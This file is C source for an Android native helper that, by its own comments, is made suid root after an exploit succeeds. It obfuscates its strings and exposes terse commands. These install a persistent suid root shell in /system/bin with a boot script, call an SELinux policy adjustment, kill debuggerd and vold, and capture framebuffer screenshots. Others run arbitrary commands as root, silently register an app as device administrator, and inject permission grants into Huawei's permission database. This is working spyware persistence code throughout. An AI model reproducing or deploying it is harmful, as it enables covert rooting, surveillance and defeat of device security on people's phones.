#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <jni.h>
#include <android/log.h>
#include <dirent.h>
#include <linux/reboot.h>
#include <linux/fb.h>
#include <linux/kd.h>

#include "suidext.h"
#include "log.h"
#include "shell_params.h"
#include "deobfuscate.h"
#include "old_shell.h"
#include "utils.h"
#include "boot_manager.h"
#include "ps.h"
#include "sqlite3_manager.h"
#include "sepolicy-inject.h"

static int copy(const char *from, const char *to);
static int log_to_file(const char *full_path, const char *content, const int len);
static unsigned int getProcessId(const char *p_processname);
static int setgod();
static void sync_reboot();
static int my_mount(const char *mntpoint);
static void my_chown(char *user, char *group, char *file);
static void my_chmod(const char *mode, const char *file);
static void add_admin(const char *appname);
static void copy_root(const char *mntpnt, const char *src, const char *dst);
static void copy_root_no_mount(const char *src, const char *dst);
static void copy_remount(const char *mntpnt, const char *src, const char *dst);
static void delete_root(const char *mntpnt, const char *dst);
static int search_content(const char *content, const char *file);
static int add_huawei_permission(const char *rcs_pkg);

//static int get_framebuffer(char *filename);
pid_t server_pid; // extern for parent PID to be killed
unsigned char daemon_opt[] = "\x3d\xe4\xd1\x10\x10\xd9\xa4\xd8\xd0\xd2\xd3"; // "--daemon"

// questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
// statuslog -c "/system/bin/cat /dev/graphics/fb0"
int exec_cmd(int argc, char** argv) {

	unsigned char fb[] = "\x3b\x23\x1a\xa3\x5f"; // "fb"
	unsigned char fb0[] = "\xd3\x05\xc7\x04\xb9\xbe\xaf\x04\xbc\xa3\xb2\xad\xc5\xba\xb0\xa0\x04\xbf\xb3\xed"; // "/dev/graphics/fb0"
	unsigned char vol[] = "\x4e\xde\x93\xc8\x21\xde"; // "vol"
	unsigned char vold1[] = "\x0b\xda\xd5\x8d\xe4\x9b\x93"; // "vold"
	unsigned char vold2[] = "\xcc\x74\xbc\x5a\x63\x60\x68"; // "vold"
	unsigned char reb[] = "\x2c\x97\xb8\x62\x77\x72"; // "reb"
	unsigned char blr[] = "\xf4\x61\x96\x96\x98\x86"; // "blr"
	unsigned char blw[] = "\x50\x1e\x4d\x4e\x44\x5b"; // "blw"
	unsigned char rt[] = "\x04\x16\x10\x9a\x90"; // "rt"
	unsigned char system1[] = "\x63\xfa\x9e\xbc\xf0\xee\xf0\xeb\xfa\xf2"; // "/system"
	unsigned char system2[] = "\xa2\xf5\x50\x77\x33\x25\x33\x3e\x49\x31"; // "/system"
	unsigned char system3[] = "\xd9\x65\xbb\x3e\x6a\x60\x6a\x77\x44\x7c"; // "/system"
	unsigned char system4[] = "\xca\xa3\x6e\x2b\xff\xf5\xff\xc2\xf1\xe9"; // "/system"
	unsigned char mntsdcard[] = "\xa4\x98\x37\xbb\xf9\xfa\xf0\xbb\xf7\xc0\xc7\xc5\xf6\xc0"; // "/mnt/sdcard"
	unsigned char sd[] = "\x2d\xcf\xe0\xe2\xd7"; // "sd"
	unsigned char ru[] = "\x2c\xb1\x9f\xbe\xbb"; // "ru"
	unsigned char air[] = "\x9b\xc5\x5d\x7a\x72\x6b"; // "air"
	unsigned char qzx[] = "\x04\x52\x55\x95\x82\x9c"; // "qzx"
	unsigned char fhc[] = "\x68\x87\xec\x12\x00\x15"; // "fhc"
	unsigned char fho[] = "\xa0\x46\xe5\x4a\x48\x53"; // "fho"
	unsigned char pzm[] = "\x2d\x7a\x54\xad\xab\xc0"; // "pzm"
	unsigned char qzs[] = "\x17\xc1\xd5\xe6\xef\xe4"; // "qzs"
	unsigned char binsh1[] = "\xdf\x14\xc5\x10\xd4\xae\xd4\xab\xda\xd2\x10\xc5\xde\xd1\x10\xd4\xdf"; // "/system/bin/sh"
	unsigned char binsh2[] = "\x0b\xeb\xee\xe4\x88\xb6\x88\x81\xb2\xba\xe4\xbf\xa6\xbb\xe4\x88\xa5"; // "/system/bin/sh"
	unsigned char adm[] = "\x5b\x25\x7d\x7a\x41\x7e"; // "adm"
	unsigned char sh[] = "\x6a\xe2\x8a\x19\x06"; // "sh"
	unsigned char lid[] = "\xb2\xf9\x48\x2e\x2d\x36"; // "lid"
	unsigned char rf[] = "\xf9\x6f\x94\x95\x61"; // "rf"
	unsigned char fhs[] = "\xe5\xe3\x05\x85\x93\x9a"; // "fhs"
	unsigned char ape[] = "\xaa\xb4\x1d\xcb\x3a\x37"; // "ape"
	unsigned char srh[] = "\x05\xcb\xcd\x8a\x89\xf3"; // "srh"
	unsigned char sql[] = "\xd6\xd7\x02\xab\xa9\x46"; // "sql"
	

	int i;
	unsigned char *da, *db;	
	
	if(argc < 2) {
	  LOG("Usage: ");
	  LOG("%s", argv[0]);
	  LOG(" <command>\n");
	  LOG("fb - try to capture a screen snapshot\n");
	  LOG("vol - kill VOLD twice\n");
	  LOG("reb - reboot the phone\n");
	  LOG("blr - mount /system in READ_ONLY\n");
	  LOG("blw - mount /system in READ_WRITE\n");
	  LOG("rt - install the root shell in /system/bin/rilcap\n");
	  LOG("ru - remove the root shell from /system/bin/rilcap\n");
	  LOG("rf <mntpoint> <file> - remove <file> from <mntpoint>");
	  LOG("sd - mount /sdcard\n");
	  LOG("air - check if the shell has root privileges\n");
	  LOG("qzx \"command\" - execute the given commandline\n");
	  LOG("fhc <src> <dest> - copy <src> to <dst>\n");
	  LOG("fhs <mntpoint> <src> <dest> - copy <src> to <dst> on mountpoint <mntpoint>\n");
	  LOG("fho <user> <group> <file> - chown <file> to <user>:<group>\n");
	  LOG("pzm <newmode> <file> - chmod <file> to <newmode>\n");
	  LOG("adm <package name/receiver>\n");
	  LOG("qzs - start a root shell\n");
	  LOG("lid <proc> <dest file> - return process id for <proc> write it to <dest file>\n");
	  LOG("ape <content> <dest file> - append text <content> to <dest files> if not yet present\n");
	  
	  return 0;
	}
	
	// Cattura uno screenshot
	if (strcmp(argv[1], deobfuscate(fb)) == 0 && argc == 3) {
		LOGD("Capturing a screenshot\n");
		char* filename = argv[2];

		copy(deobfuscate(fb0), filename);
		chmod(filename, 0666);
	} else if (strcmp(argv[1], deobfuscate(vol)) == 0) { // Killa VOLD per due volte
		unsigned int pid;
		
		LOGD("Killing VOLD\n");

		for (i = 0; i < 2; i++) {
			pid = getProcessId(deobfuscate(vold1));

			if (pid) {
				kill(getProcessId(deobfuscate(vold2)), SIGKILL);
				sleep(2);
			}	
		}
	} else if (strcmp(argv[1], deobfuscate(reb)) == 0) { // Reboot
		LOGD("Rebooting...\n");

		sync_reboot();
	} else if (strcmp(argv[1], deobfuscate(blr)) == 0) { // Monta /system in READ_ONLY
		LOGD("Mounting FS read only\n");
		remount(deobfuscate(system1), MS_RDONLY);
	} else if (strcmp(argv[1], deobfuscate(blw)) == 0) { // Monta /system in READ_WRITE
		LOGD("Mounting FS read write\n");
		remount(deobfuscate(system2), 0);
	} else if (strcmp(argv[1], deobfuscate(rt)) == 0) { // Copia la shell root in /system/bin/
	        struct stat st1;
		struct stat st2;
		char ru_cmd[4];
		
		adjust_selinux_policy();

		snprintf(ru_cmd, sizeof(ru_cmd), "%s", deobfuscate(ru));
		char *sock_args[] = {ru_cmd, ru_cmd};

		LOGD("Installing suid shell\n");
		LOGD("Argv[0] is %s\n", argv[0]);

		// Try to install the old shell
		if(argc == 3) {
		  if(install_old_shell(argv[2]))
		    return 0;
		}

		// Check if the shell is already installed and remove it
		if(stat(deobfuscate(ROOT_BIN), &st2) >= 0) {
		  LOGD("Shell already presents\n");
		  if(connect_daemon(2, sock_args, OLD_SHELL_PORT) == 0) { 
		    LOGD("RU executed in the old shell on the old port!\n");
		    sleep(3);
		  }
		  else if(connect_daemon(2, sock_args, SHELL_PORT) == 0) {
		    LOGD("RU executed in the old shell on the current port!\n");
		    sleep(3);
		  }
		}
		  
		// Mount /system as rw
		remount(deobfuscate(system3), 0);

		// Install the new shell
		copy_root_no_mount(argv[0], deobfuscate(ROOT_BIN));  // root client
		createBootScript();

		kill_debuggerd();
		sleep(2);

		// Mount as read-only
		remount(deobfuscate(system3), MS_RDONLY);

	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root
	        // Mount /system as rw
		remount(deobfuscate(system3), 0);

	        // Remove and restore the proper boot script and rilcap
	        removeBootScript();

      		// Restore knox if present
		restore_knox();
		
		// Mount /system as ro
		remount(deobfuscate(system3), MS_RDONLY);		

		// Restart debuggerd
		kill_debuggerd();

		// kill the root server process (we need to kill the listening child)
		LOGD("Killing server %d\n", (int) server_pid);
		kill(server_pid, 9);

	} else if (strcmp(argv[1], deobfuscate(rf)) == 0) {  // Cancella un file dal filesystem
		LOGD("Removing %s from %s\n", argv[3], argv[2]);
		delete_root(argv[2], argv[3]);
	} else if (strcmp(argv[1], deobfuscate(sd)) == 0) {  // Mount /sdcard
		LOGD("Mounting /sdcard\n");
		my_mount(deobfuscate(mntsdcard));
	} else if (strcmp(argv[1], deobfuscate(air)) == 0) { // Am I Root?
		LOGD("Are we root?\n");
		return setgod();
	} else if (strcmp(argv[1], deobfuscate(qzx)) == 0) { // Eseguiamo la riga passataci
		LOGD("Executing \"%s\"\n", argv[2]);
		char *exec_args[128];
		int i;

		LOGD("Exec %s %s", argv[1], argv[2]);

		if(argc == 3) {
		  exec_args[0] = strtok(argv[2], " ");
		  for(i = 1;; i++) {
		    exec_args[i] = strtok(NULL, " ");
		    
		    if(!exec_args[i]) break;
		  }
		  if(execvp(exec_args[0], exec_args) < 0)
		    LOGD("Error %d\n", errno);
		}
		else {
		  if(execvp(argv[2], argv+2) < 0)
		    LOGD("Error %d\n", errno);
		}

		return 0;
	} else if (strcmp(argv[1], deobfuscate(fhc)) == 0) { // Copiamo un file nel path specificato dal secondo argomento 
		LOGD("Copying file %s to %s\n", argv[2], argv[3]);
		copy(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(fhs)) == 0) { // Copiamo un file nel path specificato dal secondo argomento (con remount del mntpoint)
		LOGD("Copying file %s to %s on mountpoint %s\n", argv[3], argv[4], argv[2]);
		copy_remount(argv[2], argv[3], argv[4]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(fho)) == 0) { // chown: user group file
	        LOGD("Chowning to %s:%s file %s\n", argv[2], argv[3], argv[4]);
		my_chown(argv[2], argv[3], argv[4]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(pzm)) == 0) { // chmod: newmode file
		LOGD("Chmodding to %s file %s\n", argv[2], argv[3]);
		my_chmod(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(adm)) == 0) { // Add the application to the admin list
		LOGD("Adding the app %s to Administrators list\n", argv[2]);
		add_admin(argv[2]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(lid)) == 0) { // Write pid of a process to file
		LOGD("Returning process ID for %s to %s\n", argv[2], argv[3]);
		i = getProcessId(argv[2]);

		LOGD("Process id is: %d\n", i);
		log_to_file(argv[3], (char *)&i, sizeof(int));
		return 0;
	} else if (strcmp(argv[1], deobfuscate(ape)) == 0) { // Append text content to file, add newline
		LOGD("Appending %s to %s\n", argv[2], argv[3]);
		return append_content(argv[2], argv[3]);
	} else if (strcmp(argv[1], deobfuscate(srh)) == 0) { // Search for content in file return 1 if content is present 0 if not, -1 in case of error
		LOGD("Searching for %s in %s\n", argv[2], argv[3]);
		return search_content(argv[2], argv[3]);
	} else if (strcmp(argv[1], deobfuscate(qzs)) == 0) { // Eseguiamo una root shell
		const char * shell = deobfuscate(binsh1);
		char *exec_args[] = {"sh", NULL};
		LOGD("Starting root shell\n");

		execvp(shell, exec_args);

		LOGD("Exiting shell\n");
	} else if (strcmp(argv[1], deobfuscate(sql)) == 0) {

	  if(!argv[2]) return 0;
	  
	  add_huawei_permission(argv[2]);

	}

	return 0;
}

static int search_content(const char *content, const char *file) {
	FILE *fd;
	char *data = NULL;
	int size = 0;
	char *ret = NULL;

	if ((fd = fopen(file, "r")) == NULL) {
		LOGD("Unable to open source file in r mode\n");
		return -1;
	}

	fseek(fd, 0L, SEEK_END);
	size = ftell(fd);
	fseek(fd, 0L, SEEK_SET);

	data = (char *)malloc(size + 1);
	memset(data, 0x00, size + 1);

	LOGD("Reading %d bytes\n", size);

	fread(data, size, 1, fd);

	ret = strcasestr(data, content);

	fclose(fd);

	if (ret == NULL) {
		LOGD("%s not found\n", content);
		return 0;
	} else {
		LOGD("%s found\n", content);
		return 1;
	}
}

static int log_to_file(const char *full_path, const char *content, const int len) {
	int fd, ret;

	if ((fd = open(full_path, O_CREAT | O_TRUNC | O_WRONLY)) < 0) {
		LOGD("Unable to create %s\n", full_path);
		return -1;
	}

	ret = write(fd, content, (size_t)len);

	if (ret < 0) {
		LOGD("Error writing to file\n");
		close(fd);
		return -1;
	}

	if (ret < len) {
		LOGD("Written %d bytes to file instead of %d bytes\n", ret, len);
	}

	close(fd);
	chmod(full_path, 0666);

	return 1;
}

static void my_chmod(const char *mode, const char *file) {
	unsigned char o[] = "\xa0\xf6\x54\x8d\x33"; // "%o"	
	int newmode;

	sscanf(mode, deobfuscate(o), &newmode);
	chmod(file, newmode);
}

static void my_chown(char *user, char *group, char *file) {
        unsigned char chown_str[] = "\x35\x76\x52\xe6\xca\xb4\xca\xc1\xb0\xb8\xe6\xbb\xa4\xa7\xe6\xba\xa5\xa6\xce\xa7"; // "/system/bin/chown"
	char str[] = "%s:%s";
	char buf[256];  

	memset(buf, 0, sizeof(buf));	
	sprintf(buf, str, user, group);

	char *args[] = {deobfuscate(chown_str), buf, file, NULL};
	execvp(deobfuscate(chown_str),  args);	

	return; 
}

static void delete_root(const char *mntpnt, const char *dst) {
	if (mntpnt != NULL)
		remount(mntpnt, 0);

	unlink(dst);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
}

static void copy_root(const char *mntpnt, const char *src, const char *dst) {
	
	if (mntpnt != NULL)
	 	remount(mntpnt, 0);

	copy(src, dst);
	chown(dst, 0, 0);
	chmod(dst, 04755);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
}

static void copy_root_no_mount(const char *src, const char *dst) {

	copy(src, dst);
	chown(dst, 0, 0);
	chmod(dst, 04755);
}

static void copy_remount(const char *mntpnt, const char *src, const char *dst) {
	if (mntpnt != NULL)
		remount(mntpnt, 0);

	copy(src, dst);
	chown(dst, 0, 0);

	if (mntpnt != NULL)
		remount(mntpnt, MS_RDONLY);
}

static int copy(const char *from, const char *to) {
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0) {
		LOGD("Unable to open source file\n");
		return -1;
	}

	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		LOGD("Unable to open destination file\n");
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));

		if (r <= 0)
			break;

		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);

	sync();
	sync();

	return r;
}

static unsigned int getProcessId(const char *p_processname) {
	unsigned char proc1[] = "\xa4\x08\xaa\x9b\xd4\xd6\xdb\xc7\x9b"; // "/proc/"
	unsigned char numbers[] = "\x7d\x9b\xec\x73\x7c\x71\x72\x7f\x78\x7d\x7e\x7b\x44"; // "0123456789"
	unsigned char proc2[] = "\x2f\xe1\xc8\x00\xa1\xdf\xc0\xcc\x00"; // "/proc/"
	unsigned char slash[] = "\x45\x50\x14\xea"; // "/"
	unsigned char exe[] = "\x7f\x53\x2f\x3e\x09\x3e"; // "exe"
	
    DIR *dir_p;
    struct dirent *dir_entry_p;
    char dir_name[128];
    char target_name[252];
    int target_result;
    char exe_link[252];
    int errorcount;
    int result;
	
    errorcount = 0;
    result = 0;

    dir_p = opendir(deobfuscate(proc1));

    while (NULL != (dir_entry_p = readdir(dir_p))) {
        if (strspn(dir_entry_p->d_name, deobfuscate(numbers)) == strlen(dir_entry_p->d_name)) {
            strcpy(dir_name, deobfuscate(proc2));
            strcat(dir_name, dir_entry_p->d_name);
            strcat(dir_name, deobfuscate(slash));

            exe_link[0] = 0;
            strcat(exe_link, dir_name);
            strcat(exe_link, deobfuscate(exe));
            target_result = readlink(exe_link, target_name, sizeof(target_name) - 1);

            if (target_result > 0) {
                target_name[target_result] = 0;

                if (strstr(target_name, p_processname) != NULL) {
                    result = atoi(dir_entry_p->d_name);
                    closedir(dir_p);

                    LOGD("getProcessID(%s) id = %d\n", p_processname, result);
                    return result;
                }
            }
        }
    }

    closedir(dir_p);

    LOGD("getProcessID(%s) id = 0 (could not find process)\n", p_processname);

    return result;
}

static void sync_reboot() {
	sync();

	if (reboot(LINUX_REBOOT_CMD_RESTART) < 0) {
		LOGD("Error rebooting: %d\n", errno);
	}
}


static int my_mount(const char *mntpoint) {
	unsigned char t1[] = "\x77\xe9\x9c\xa9\x8e"; // " \t"
	unsigned char t2[] = "\xab\xbd\x14\xf5\xe2"; // " \t"
	unsigned char t3[] = "\x95\xc1\x56\xb7\x9c"; // " \t"
	unsigned char mounts[] = "\x4e\x10\x52\x61\x5e\x5c\x21\x2d\x61\x23\x21\x5b\x20\x5a\x5d"; // "/proc/mounts"
	unsigned char r[] = "\x92\xaf\x3c\x20"; // "r"

    FILE *f = NULL;
    int found = 0;
    char buf[1024], *dev = NULL, *fstype = NULL;

    if ((f = fopen(deobfuscate(mounts), deobfuscate(r))) == NULL) {
		LOGD("Unable to open /proc/mounts\n");
        return -1;
    }

    memset(buf, 0, sizeof(buf));

    for (;!feof(f);) {
        if (fgets(buf, sizeof(buf), f) == NULL)
            break;

        if (strstr(buf, mntpoint)) {
            found = 1;
            break;
        }
    }

    fclose(f);

    if (!found) {
		LOGD("Cannot find mountpoint\n");
        return -1;
    }

    if ((dev = strtok(buf, deobfuscate(t1))) == NULL) {
		LOGD("Cannot find first mount entry\n");
        return -1;
    }

    if (strtok(NULL, deobfuscate(t2)) == NULL) {
		LOGD("Cannot find second mount entry\n");
        return -1;
    }

    if ((fstype = strtok(NULL, deobfuscate(t3))) == NULL) {
		LOGD("Cannot find third mount entry\n");
        return -1;
    }

    return mount(dev, mntpoint, fstype, 0, 0);
}

static void add_admin(const char *appname) {
	unsigned char pfile[] = "\x6e\xaa\xe4\x41\x1e\x13\x6e\x13\x41\x6d\x6b\x6d\x6e\x1f\x07\x41\x1e\x1f\x68\x1b\x1d\x1f\x71\x62\x01\x06\x1b\x1d\x1b\x1f\x6d\x40\x6a\x07\x06"; // "/data/system/device_policies.xml"
	unsigned char policies[] = "\xf0\x99\x63\xfc\x80\xa1\xac\xab\xb5\xab\xb7\x85\xfe"; // "<policies>"
	unsigned char cpolicies[] = "\xaa\x7a\xdc\x6a\x2e\x45\x3a\x47\x39\x47\x33\x29\x7e\x85\x74"; // "<policies />"
	unsigned char cpol[] = "\x4b\x1d\x5d\x89\x9c\x45\x5c\x59\x22\x58\x22\x56\x48\x8f"; // "</policies>"
	unsigned char admin1[] = "\x85\xe1\x6a\x91\x7b\x24\x23\x28\x2c\x2d\x67\x2d\x24\x28\x20\x78\x69"; // "\n<admin name=""

	// com.android.networking/com.android.networking.listener.AR
	unsigned char admin2[] =  "\xbe\xfe\x65\x64\x80\x4c\x7e\x32\x31\x2e\x2b\x25\x2b\x27\x35\x62\x28\x2e\x23\x29\x35\x7f\x64\x76\x79\x7b\x64\x62\x71\x80\x4c\x7e\x71\x23\x26\x2f\x2b\x30\x80\x4c"; // "\">\n<policies flags=\"479\" />\n</admin>\n"
	unsigned char init[] = "\x67\xdf\x80\xe5\xe8\x21\x36\x35\xf9\x2f\x3e\x2b\x2c\x32\x38\x37\xe6\xc0\xea\xf7\xe9\xc0\xf9\x3e\x37\x3c\x38\x3d\x32\x37\x00\xe6\xc0\x2e\x2d\x3f\xf6\xe1\xc0\xf9\x2c\x2d\x3a\x37\x3d\x3a\x35\x38\x37\x3e\xe6\xc0\x22\x3e\x2c\xc0\xf9\xe8\xe7"; // "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>"
	unsigned char nl[] = "\x26\x45\x62\x34"; // "\n"
    char *buf = NULL;
    char *ptr = NULL;

    int fd, size;

    fd = open(deobfuscate(pfile), O_RDWR);

    if (fd < 0) {
        LOGD("Policy file cannot be opened\n");
        return;
    }

    size = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);

    if (size == 0) {
        write(fd, deobfuscate(init), strlen(deobfuscate(init)));
        write(fd, deobfuscate(cpolicies), strlen(deobfuscate(cpolicies)));
        size = lseek(fd, 0, SEEK_END);
        lseek(fd, 0, SEEK_SET);
    }

    if (size == 0) {
        LOGD("Something went terribly wrong here\n");
        return;
    }

    buf = (char *)malloc(size + 1);

    if (buf == NULL) {
        LOGD("Cannot allocate memory\n");
        close(fd);
        return;
    }

    memset(buf, 0x00, size + 1);

    read(fd, buf, size);
    lseek(fd, 0, SEEK_SET);

	if (strstr(buf, appname)) {
		LOGD("Application already in the manifest\n");
		memset(buf, 0x00, size + 1);
		free(buf);
		close(fd);
		return;
	}
	
    ptr = strstr(buf, deobfuscate(policies));

    // No admins already set
    if (ptr == NULL) {
        ptr = strstr(buf, deobfuscate(cpolicies));

        if (ptr == NULL) {
            LOGD("Malformed file\n");
            return;
        }

        write(fd, buf, ptr - buf);
        write(fd, deobfuscate(nl), strlen(deobfuscate(nl)));
        write(fd, deobfuscate(policies), strlen(deobfuscate(policies)));
        write(fd, deobfuscate(admin1), strlen(deobfuscate(admin1)));
        write(fd, appname, strlen(appname));
        write(fd, deobfuscate(admin2), strlen(deobfuscate(admin2)));
        write(fd, deobfuscate(cpol), strlen(deobfuscate(cpol)));
    } else {
        write(fd, buf, (ptr - buf + strlen(deobfuscate(policies))));
        write(fd, deobfuscate(admin1), strlen(deobfuscate(admin1)));
        write(fd, appname, strlen(appname));
        write(fd, deobfuscate(admin2), strlen(deobfuscate(admin2)));
        write(fd, ptr + strlen(deobfuscate(policies)), strlen(ptr + strlen(deobfuscate(policies))));
    }

    memset(buf, 0x00, size + 1);
    free(buf);
    close(fd);
    LOGD("Administrator app added successfully\n");
}

static int add_huawei_permission(const char *rcs_pkg) {
  unsigned char sys_pkg[] = "\xb0\x55\xfc\xa1\x7c\x73\x4c\x73\xa1\x4d\x4b\x4d\x4c\x7f\x67\xa1\x40\x73\x7d\x65\x73\x79\x7f\x4d\xa6\x48\x67\x64"; // "/data/system/packages.xml"
  unsigned char hw_db[] = "\x99\x1a\xbc\xca\x0d\x08\x1d\x08\xca\x0d\x08\x1d\x08\xca\x0e\x0a\x14\xcb\x11\x1c\x08\x12\x0c\x10\xcb\x19\x0c\x1f\x14\x10\x1e\x1e\x10\x0a\x0b\x14\x08\x0b\x08\x02\x0c\x1f\xca\x0d\x08\x1d\x08\x0f\x08\x1e\x0c\x1e\xca\x19\x0c\x1f\x14\x10\x1e\x1e\x10\x0a\x0b\xcb\x0d\x0f"; // "/data/data/com.huawei.permissionmanager/databases/permission.db"
  unsigned char obf_query[] = "\xc5\x29\x9c\x9c\x9d\x96\x80\xe9\x93\x27\x9c\x9d\x93\x9a\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xe5\xe2\x27\x3f\xea\xfc\xe3\x3b\x27\xf7\xe4\xe6\xfe\xe4\xe2\xe0\x9d\xe4\xf8\xe0\x3b\x27\xf0\xfc\xe3\x3b\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xfa\xe3\xe0\x3b\x27\xf7\xe0\xc9\xf8\xfc\xf6\xf6\xfc\xfa\xfd\x86\xe5\xe2\x3c\x27\x95\x84\x9b\x90\x80\x96\x27\x3f\x34\x37\x37\x37\x3b\x27\x22\x20\xf6\x22\x3b\x27\x20\xe3\x3b\x27\x20\xe3\x3b\x27\x37\x3c\x0e"; // "INSERT INTO permissionCfg (_id, packageName, uid, permissionCode, permissionCfg) VALUES (1000, '%s', %d, %d, 0);"
  int uid;
  char query[2048];
  int permissions = 60191;
  
  if(!rcs_pkg)
    return 0;

  uid = get_package_uid(rcs_pkg);    
  if(!uid) return 0;

  memset(query, 0, sizeof(query));
  snprintf(query, sizeof(query), deobfuscate(obf_query), rcs_pkg, uid, permissions);

  LOGD("Query: %s\n", query);

  if(sqlite_manager_init()) 
    sqlite_manager_query(deobfuscate(hw_db), query);

  return 1;

}


static int setgod() {
    
    return (getuid() == 0) ? 1 : 0;
}
